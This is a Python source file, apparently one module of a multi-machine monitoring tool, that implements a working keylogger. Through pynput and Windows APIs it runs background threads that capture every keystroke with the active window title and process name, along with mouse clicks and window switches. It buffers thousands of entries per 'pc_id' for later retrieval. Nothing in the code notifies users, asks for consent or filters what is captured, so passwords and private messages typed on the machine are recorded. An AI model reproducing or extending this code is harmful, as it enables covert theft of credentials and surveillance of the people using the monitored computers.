"""
Monitoring Module - Core event logging and tracking
Handles keyboard, mouse, and window monitoring
"""
import threading
from datetime import datetime
from pynput import keyboard, mouse
import platform

# Platform-specific imports
if platform.system() == 'Windows':
    try:
        import win32gui
        import win32process
        import psutil
        WINDOWS_SUPPORT = True
    except ImportError:
        WINDOWS_SUPPORT = False
        print("Warning: Windows-specific features unavailable")
else:
    WINDOWS_SUPPORT = False

# Global state
monitoring_active = {}
event_logs = {}
keystroke_buffers = {}
last_activity = {}
monitor_threads = {}

# Locks for thread safety
events_lock = threading.Lock()
keystrokes_lock = threading.Lock()


def log_event(event_type, details, pc_id):
    """Log an event"""
    with events_lock:
        if pc_id not in event_logs:
            event_logs[pc_id] = []
        
        event_logs[pc_id].append({
            "type": event_type,
            "timestamp": datetime.now().isoformat(),
            "details": details
        })
        
        # Keep only last 1000 events
        if len(event_logs[pc_id]) > 1000:
            event_logs[pc_id].pop(0)
        
        # Update last activity
        last_activity[pc_id] = datetime.now()


def log_keystroke(key, window_title, pc_id):
    """Log a keystroke"""
    with keystrokes_lock:
        if pc_id not in keystroke_buffers:
            keystroke_buffers[pc_id] = []
        
        keystroke_buffers[pc_id].append({
            "key": str(key).replace("'", ""),
            "window": window_title,
            "timestamp": datetime.now().isoformat()
        })
        
        # Keep only last 5000 keystrokes
        if len(keystroke_buffers[pc_id]) > 5000:
            keystroke_buffers[pc_id].pop(0)
        
        # Update last activity
        last_activity[pc_id] = datetime.now()


def get_active_window_title():
    """Get the title of the active window"""
    if not WINDOWS_SUPPORT:
        return "Unknown Window"
    
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title if title else "Unknown Window"
    except:
        return "Unknown Window"


def get_active_process_name():
    """Get the name of the process that owns the active window"""
    if not WINDOWS_SUPPORT:
        return "Unknown Process"
    
    try:
        window = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(window)
        process = psutil.Process(pid)
        return process.name()
    except:
        return "Unknown Process"


def keyboard_listener(pc_id):
    """Keyboard monitoring thread"""
    def on_press(key):
        if not monitoring_active.get(pc_id, False):
            return False
        
        try:
            window_title = get_active_window_title()
            log_keystroke(key, window_title, pc_id)
            
            # Log as event too (for searching)
            log_event("key_press", {
                "key": str(key).replace("'", ""),
                "window": window_title,
                "process": get_active_process_name()
            }, pc_id)
        except Exception as e:
            print(f"Keyboard logging error: {e}")
    
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        print(f"Keyboard listener error: {e}")


def mouse_listener(pc_id):
    """Mouse monitoring thread"""
    last_window = None
    
    def on_click(x, y, button, pressed):
        if not monitoring_active.get(pc_id, False):
            return False
        
        if pressed:
            try:
                window_title = get_active_window_title()
                log_event("mouse_click", {
                    "button": str(button),
                    "x": x,
                    "y": y,
                    "window": window_title,
                    "process": get_active_process_name()
                }, pc_id)
            except Exception as e:
                print(f"Mouse logging error: {e}")
    
    def on_move(x, y):
        nonlocal last_window
        
        if not monitoring_active.get(pc_id, False):
            return False
        
        try:
            current_window = get_active_window_title()
            if current_window != last_window and last_window is not None:
                log_event("window_change", {
                    "title": current_window,
                    "process": get_active_process_name()
                }, pc_id)
                last_window = current_window
            elif last_window is None:
                last_window = current_window
        except Exception as e:
            print(f"Window tracking error: {e}")
    
    try:
        with mouse.Listener(on_click=on_click, on_move=on_move) as listener:
            listener.join()
    except Exception as e:
        print(f"Mouse listener error: {e}")


def start_monitoring(pc_id):
    """Start monitoring for a specific PC"""
    if monitoring_active.get(pc_id, False):
        return {"status": "already_running", "pc_id": pc_id}
    
    monitoring_active[pc_id] = True
    
    # Initialize storage
    if pc_id not in event_logs:
        event_logs[pc_id] = []
    if pc_id not in keystroke_buffers:
        keystroke_buffers[pc_id] = []
    
    # Start monitoring threads
    keyboard_thread = threading.Thread(target=keyboard_listener, args=(pc_id,), daemon=True)
    mouse_thread = threading.Thread(target=mouse_listener, args=(pc_id,), daemon=True)
    
    keyboard_thread.start()
    mouse_thread.start()
    
    monitor_threads[pc_id] = {
        'keyboard': keyboard_thread,
        'mouse': mouse_thread
    }
    
    log_event("monitoring_started", {"pc_id": pc_id}, pc_id)
    
    print(f"[+] Monitoring started for {pc_id}")
    return {"status": "started", "pc_id": pc_id}


def stop_monitoring(pc_id):
    """Stop monitoring for a specific PC"""
    if not monitoring_active.get(pc_id, False):
        return {"status": "not_running", "pc_id": pc_id}
    
    monitoring_active[pc_id] = False
    log_event("monitoring_stopped", {"pc_id": pc_id}, pc_id)
    
    print(f"[-] Monitoring stopped for {pc_id}")
    return {"status": "stopped", "pc_id": pc_id}


def get_monitoring_status(pc_id=None):
    """Get monitoring status"""
    if pc_id:
        return monitoring_active.get(pc_id, False)
    return any(monitoring_active.values())


def get_events(pc_id=None):
    """Get logged events"""
    with events_lock:
        if pc_id:
            return event_logs.get(pc_id, []).copy()
        
        # Return all events from all PCs
        all_events = []
        for events in event_logs.values():
            all_events.extend(events)
        return all_events


def get_keystrokes(pc_id=None):
    """Get logged keystrokes"""
    with keystrokes_lock:
        if pc_id:
            return keystroke_buffers.get(pc_id, []).copy()
        
        # Return all keystrokes from all PCs
        all_keystrokes = []
        for keystrokes in keystroke_buffers.values():
            all_keystrokes.extend(keystrokes)
        return all_keystrokes


def get_last_activity(pc_id=None):
    """Get timestamp of last activity"""
    if pc_id:
        return last_activity.get(pc_id, datetime.now())
    
    # Return most recent activity across all PCs
    if last_activity:
        return max(last_activity.values())
    return datetime.now()


def clear_events(pc_id=None):
    """Clear event logs"""
    with events_lock:
        if pc_id:
            event_logs[pc_id] = []
        else:
            event_logs.clear()


def clear_keystrokes(pc_id=None):
    """Clear keystroke buffer"""
    with keystrokes_lock:
        if pc_id:
            keystroke_buffers[pc_id] = []
        else:
            keystroke_buffers.clear()